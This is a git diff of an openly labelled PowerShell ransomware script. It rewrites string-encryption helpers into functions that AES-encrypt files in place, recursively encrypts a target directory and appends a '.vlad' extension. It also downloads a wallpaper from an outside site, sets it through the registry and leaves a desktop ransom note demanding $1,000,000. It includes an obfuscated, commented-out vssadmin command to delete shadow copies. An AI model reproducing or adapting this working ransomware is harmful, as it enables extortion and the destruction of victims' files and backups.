@@ -1,110 +1,107 @@
 
 
 # Function to encrypt a string using AES encryption
-function Encrypt-String {
+function Encrypt-File {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$InputString,
-        
+        [string]$FilePath,
         [Parameter(Mandatory=$true)]
         [string]$EncryptionKey
     )
-    
+
     try {
-        # Convert the input string to bytes
-        $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
-        
-        # Create a new AES object
+        # Read file content as bytes
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+
+        # Create AES object
         $aes = [System.Security.Cryptography.Aes]::Create()
         $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
         $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        
-        # Generate a random IV (Initialization Vector)
+
+        # Generate random IV
         $aes.GenerateIV()
-        
-        # Derive a key from the provided encryption key using PBKDF2
+
+        # Derive key from password
         $salt = [System.Text.Encoding]::UTF8.GetBytes("PowerShellAES")
         $keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($EncryptionKey, $salt, 10000)
         $aes.Key = $keyDerivation.GetBytes(32) # 256-bit key
-        
+
         # Create encryptor
         $encryptor = $aes.CreateEncryptor()
-        
-        # Encrypt the data
-        $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)
-        
+
+        # Encrypt file bytes
+        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
+
         # Combine IV and encrypted data
         $combinedBytes = $aes.IV + $encryptedBytes
+
+        # Write encrypted data back to file (or you can specify a new file)
+        [System.IO.File]::WriteAllBytes($FilePath, $combinedBytes)
         
-        # Convert to Base64 for easy storage/transmission
-        $encryptedString = [System.Convert]::ToBase64String($combinedBytes)
-        
+
         # Clean up
         $encryptor.Dispose()
         $aes.Dispose()
         $keyDerivation.Dispose()
-        
-        return $encryptedString
+
+        Write-Host "File encrypted successfully."
     }
     catch {
-        Write-Error "Encryption failed: $($_.Exception.Message)"
-        return $null
+        Write-Error "File encryption failed: $($_.Exception.Message)"
     }
 }
 
 # Function to decrypt a string using AES decryption
-function Decrypt-String {
+function Decrypt-File {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$EncryptedString,
+        [string]$FilePath,
         [Parameter(Mandatory=$true)]
         [string]$EncryptionKey
     )
-    
+
     try {
-        # Convert from Base64
-        $combinedBytes = [System.Convert]::FromBase64String($EncryptedString)
-        
-        # Create a new AES object
+        # Read encrypted file content as bytes
+        $combinedBytes = [System.IO.File]::ReadAllBytes($FilePath)
+
+        # Create AES object
         $aes = [System.Security.Cryptography.Aes]::Create()
         $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
         $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        
+
         # Extract IV (first 16 bytes)
         $ivSize = 16
         $aes.IV = $combinedBytes[0..($ivSize-1)]
-        
+
         # Extract encrypted data (remaining bytes)
         $encryptedBytes = $combinedBytes[$ivSize..($combinedBytes.Length-1)]
-        
-        # Derive the key from the provided encryption key
+
+        # Derive key from password
         $salt = [System.Text.Encoding]::UTF8.GetBytes("PowerShellAES")
         $keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($EncryptionKey, $salt, 10000)
         $aes.Key = $keyDerivation.GetBytes(32) # 256-bit key
-        
+
         # Create decryptor
         $decryptor = $aes.CreateDecryptor()
-        
-        # Decrypt the data
+
+        # Decrypt file bytes
         $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
-        
-        # Convert back to string
-        $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
-        
+
+        # Write decrypted data back to file (or you can specify a new file)
+        [System.IO.File]::WriteAllBytes($FilePath, $decryptedBytes)
+
         # Clean up
         $decryptor.Dispose()
         $aes.Dispose()
         $keyDerivation.Dispose()
-        
-        return $decryptedString
+
+        Write-Host "File decrypted successfully."
     }
     catch {
-        Write-Error "Decryption failed: $($_.Exception.Message)"
-        return $null
+        Write-Error "File decryption failed: $($_.Exception.Message)"
     }
 }
 # Function to call file encryption and overwrite old file
-
 
 function main{
     param (
@@ -116,30 +113,29 @@ function main{
     Invoke-WebRequest -Uri 'https://i.imgflip.com/a4oy3p.jpg' -OutFile "$env:USERPROFILE\Downloads\Wallpaper.jpg"
     $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
     foreach($file in $Target){
-        $FileString = Get-Content $file -Raw
-        $EncFileData=Encrypt-String -InputString $FileString -EncryptionKey $EncKey
-        [System.IO.File]::WriteAllText($file,$EncFileData)
-        $NewFileName=[System.IO.Path]::ChangeExtension($file,".vlad")
-        Rename-Item -Path $file -NewName $NewFileName
+        Encrypt-File -FilePath $File -EncryptionKey $EncKey
+        Rename-Item -Path $file -NewName $file+".vlad" -Force
+        #Decrypt-File -FilePath $NewFileName -EncryptionKey $EncKey
     }
     try {
-        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
-        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
+        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File -ErrorAction Stop
+        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000' -ErrorAction Stop
         Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
-        
     }
     catch {
-        Write-Host "Something went wrong :/"
+        Remove-Item Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
+        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
+        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'Looks like you got got again! Pro tip: dont run the ransowmare script twice' -ErrorAction Stop
+        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
     }
-
+    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
 }
 
-$path = 'C:\Users\Vadim.AzureAD\Desktop\Test'
 
-
-# Example usage:
-#$encrypted = Encrypt-String -InputString $string -EncryptionKey "MySecretKey123"
-#$decrypted = Decrypt-String -EncryptedString $encrypted -EncryptionKey "MySecretKey123"
-
-Write-host (main -TargetDirectory $path) 
+$path = 'C:\Program Files (x86)\Steam\steamapps\common\WW1GameSeries\Verdun'
+$AS = "vssadmi"
+$AZ = "n.exe delete shadows /all /quiet"
+$AD = $AS + $AZ
+#Invoke-Expression $AD
+main -TargetDirectory $path -EncKey 123 
 Rundll32.exe user32.dll,UpdatePerUserSystemParameters
